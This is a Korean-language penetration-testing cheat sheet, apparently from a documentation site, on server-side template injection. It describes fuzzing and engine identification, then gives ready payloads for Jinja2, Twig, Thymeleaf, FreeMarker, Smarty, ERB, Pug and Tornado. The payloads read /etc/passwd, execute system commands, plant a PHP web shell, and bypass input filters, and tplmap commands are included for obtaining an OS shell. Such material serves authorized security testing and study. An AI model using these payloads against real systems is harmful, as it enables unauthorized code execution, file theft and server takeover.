---
sidebar_position: 6
title: Server-Side Template Injection (SSTI)
---

# Server-Side Template Injection (SSTI) 취약점 진단

## Overview

**SSTI (Server-Side Template Injection)**: 웹 애플리케이션이 사용자 입력을 템플릿 엔진에 직접 결합하여 렌더링할 때, 공격자가 악의적인 템플릿 구문을 삽입하여 서버 측에서 코드를 실행하게 만드는 취약점

- **위험성**: 단순 정보 유출부터 서버 장악(RCE)까지 이어질 수 있는 고위험 취약점
- **대표 템플릿 엔진**: Jinja2(Python), Twig(PHP), Thymeleaf(Java), FreeMarker(Java), Smarty(PHP) 등

---

## 1. Reconnaissance (탐지 및 엔진 식별)

### Fuzzing 문자열 주입
입력 폼에 다양한 템플릿 엔진의 메타 문자를 주입하여 오류 발생 여부 확인
```text
${{<%[%'"}}%\.
```

### 템플릿 엔진 식별 (수학 연산 테스트)
엔진별로 문법이 다르므로, 연산 결과를 통해 사용 중인 템플릿 엔진을 특정
```text
# 공통 테스트
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

# 결과 분석
- 49 출력: 템플릿 인젝션 취약점 존재
- 7*7 출력: 단순 문자열로 처리됨 (안전)
```

---

## 2. Exploitation (엔진별 페이로드)

### Jinja2 (Python / Flask)
```python
# 1. Config 및 내장 객체 읽기
{{ config.items() }}
{{ self.__dict__ }}

# 2. 클래스 탐색을 통한 파일 읽기 (인덱스는 환경마다 다를 수 있음)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# 3. 원격 코드 실행 (RCE - subprocess.Popen 클래스 활용)
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() }}
```

### Twig (PHP)
```php
# 환경 변수 및 설정 노출
{{ dump(app) }}
{{ app.request.server.all|join(',') }}

# RCE (FilterCallback 덮어쓰기)
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("whoami") }}
```

### Thymeleaf / FreeMarker (Java)
```java
# [Thymeleaf]
${T(java.lang.Runtime).getRuntime().exec('calc')}
*{T(java.lang.Runtime).getRuntime().exec('calc')}

# [FreeMarker]
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
[#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}
```

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### 기타 엔진 (ERB, Pug, Tornado)
```ruby
# ERB (Ruby)
<%= system('whoami') %>
<%= File.open('/etc/passwd').read %>

# Pug (Node.js)
- var x = root.process
- x.mainModule.require('child_process').exec('whoami')

# Tornado (Python)
{% import os %}{{os.system('whoami')}}
```

---

## 3. Advanced Techniques

### 필터링 우회 기법 (Python/Jinja2 중심)
```python
# 1. 공백 차단 우회
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# 2. 따옴표(') 차단 우회 (request.args 활용)
{{request.application.__globals__.__builtins__.__import__(request.args.x).system(request.args.c)}}&x=os&c=whoami

# 3. 특정 키워드(class, mro 등) 필터 우회
{{'__cla'+'ss__'}}
{{''['__cla''ss__']}}
```

### 자동화 도구 (tplmap)
SSTI 취약점 탐지 및 쉘 획득을 자동화해주는 특화 도구
```bash
# 기본 탐지 및 익스플로잇
./tplmap.py -u 'http://<target>/?name=test'

# POST 데이터 대상 스캔
./tplmap.py -u 'http://<target>/' -d 'name=test'

# OS Shell 획득
./tplmap.py -u 'http://<target>/?name=test' --os-shell
```
